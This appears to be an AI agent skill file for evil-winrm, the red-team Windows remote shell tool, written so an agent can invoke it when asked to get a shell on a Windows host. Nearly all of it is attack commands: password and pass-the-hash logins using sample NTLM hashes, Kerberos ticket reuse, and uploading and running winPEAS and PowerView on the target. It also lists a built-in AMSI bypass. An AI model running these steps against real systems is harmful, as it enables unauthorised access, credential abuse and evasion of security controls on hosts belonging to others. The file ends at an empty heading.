---
name: evil-winrm
description: "Interactive WinRM shell for Windows remote management with support for pass-the-hash, pass-the-ticket, SSL, file upload/download, and PowerShell scripts. Use when asked to get a shell on a Windows host via WinRM, use pass-the-hash over WinRM, upload tools, or run PowerShell remotely."
license: GPL-3.0
compatibility: "Linux, macOS. Install: gem install evil-winrm or apt install evil-winrm (Kali). Requires WinRM enabled on target (port 5985/5986)."
metadata:
  author: AeonDave
  version: "1.0"
---

# evil-winrm

Interactive WinRM shell — the standard for Windows remote access in red team ops.

## Quick Start

```bash
# Connect with password
evil-winrm -i 192.168.1.10 -u administrator -p Password123

# Pass-the-hash (NTLM)
evil-winrm -i 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117

# With SSL (port 5986)
evil-winrm -i 192.168.1.10 -u admin -p Password123 -S
```

## Core Flags

| Flag | Description |
|------|-------------|
| `-i <ip>` | Target IP/hostname |
| `-u <user>` | Username |
| `-p <pass>` | Password |
| `-H <hash>` | NTLM hash (LM:NT or NT only) |
| `-P <port>` | WinRM port (default 5985) |
| `-S` | Use SSL (port 5986) |
| `-c <cert>` | Client certificate for auth |
| `-r <realm>` | Kerberos realm |
| `-s <path>` | Path to PowerShell scripts to load |
| `-e <path>` | Path to executables (for upload) |
| `-l <path>` | Log output to file |
| `--no-colors` | Disable colors |

## Shell Commands

Once connected, use built-in evil-winrm commands:

| Command | Description |
|---------|-------------|
| `upload <local> [remote]` | Upload file to target |
| `download <remote> [local]` | Download file from target |
| `menu` | Show available functions |
| `Invoke-Binary <path>` | Execute binary from upload path |
| `Bypass-4MSI` | AMSI bypass (built-in) |
| `services` | List running services |
| `exit` | Close session |

## Common Workflows

```bash
# Basic session
evil-winrm -i 10.10.10.10 -u admin -p "Password123"

# Pass-the-hash after extracting hashes
evil-winrm -i 10.10.10.10 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"

# Upload a tool and execute
evil-winrm -i 10.10.10.10 -u admin -p pass -e /opt/tools/
# Inside shell:
# upload /opt/tools/winpeas.exe
# ./winpeas.exe

# Load custom PS scripts
evil-winrm -i 10.10.10.10 -u admin -p pass -s /opt/scripts/
# Inside shell:
# PowerView.ps1
# Get-NetDomain

# Kerberos auth (with valid ticket)
export KRB5CCNAME=/tmp/admin.ccache
evil-winrm -i dc.domain.local -r DOMAIN.LOCAL -u admin
```

## Resources

| File | When to load |
|------|--------------|
| `references/winrm-setup.md` | WinRM configuration, firewall rules, Kerberos auth setup |

## Structuring This Skill
